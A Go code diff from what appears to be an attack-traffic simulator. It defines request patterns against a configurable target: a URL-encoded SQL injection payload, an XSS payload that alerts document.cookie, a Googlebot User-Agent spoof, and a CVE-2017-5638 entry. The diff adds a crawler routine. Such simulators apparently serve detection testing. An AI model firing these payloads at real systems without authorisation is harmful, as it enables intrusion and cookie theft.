@@ -121,7 +121,7 @@ func (p *program) Start(s service.Service) error {
 		minRequests: 800, url: fmt.Sprintf("http://%s/?user_id=%s", target, "1029292%20OR%2019%3D19%20--%20-")}
 	xssBlast = Attack{name: "XSS Blast", method: "GET", maxNap: 7000, minNap: 1, maxRequests: 1200, pause: 1,
 		minRequests: 100, url: fmt.Sprintf("http://%s/forum/memberlist.php?account=%s", target, "%5C%22%3E%5C%22%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E")}
-	impostor = Attack{name: "Impostor", method: "GET", maxNap: 0, minNap: 0, pause: 1, minRequests: 100, url: fmt.Sprintf("http://%s/%svid.mov", target, RandomString(10)),
+	impostor = Attack{name: "Impostor", method: "GET", maxNap: 0, minNap: 0, pause: 1, minRequests: 100, maxRequests: 150, url: fmt.Sprintf("http://%s/%svid.mov", target, RandomString(10)),
 		headers: map[string]string{"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}}
 	cve20175638 = Attack{name: "cve20175638", method: "GET", maxNap: 0, minNap: 0, pause: 1,
 		maxRequests: 1800, minRequests: 2, url: fmt.Sprintf("http://%s/", target),
@@ -275,7 +275,7 @@ func (attack *Attack) send() {
 		
 	} else if attack.name == "Impostor" {
 		Info.Println(fmt.Sprintf("Executing %s attack: method,url,body %s %s %s", attack.name, attack.method, attack.url, attack.body))
-		attack.link(100, req)
+		attack.crawler(req)
 
 	} else {
 		/* Get random # of requests to send */
@@ -339,6 +339,30 @@ func (attack *Attack) redirect(request *http.Request) {
 	i := 1
 	modBy := random(attack.minRequests, attack.maxRequests)
 	for _, element := range urls {
+		if i%modBy == 0 {
+			address.WriteString(attack.url)
+			address.WriteString(element)
+			parsedUrl, err := url.Parse(address.String())
+			request.URL = parsedUrl
+			resp, err := http.DefaultClient.Do(request)
+			if err != nil {
+				Error.Println(fmt.Sprintf("The following error occurred while executing %s:%s", attack.name, err.Error()))
+			}
+			if resp != nil {
+				resp.Body.Close()
+			}
+			address.Reset()
+		}
+		i++
+		time.Sleep(time.Duration(modBy) * time.Second)
+	}
+}
+
+func (attack *Attack) crawler(request *http.Request) {
+	var address bytes.Buffer
+	i := 1
+	modBy := random(attack.minRequests, attack.maxRequests)
+	for _, element := range crawlerpaths {
 		if i%modBy == 0 {
 			address.WriteString(attack.url)
 			address.WriteString(element)
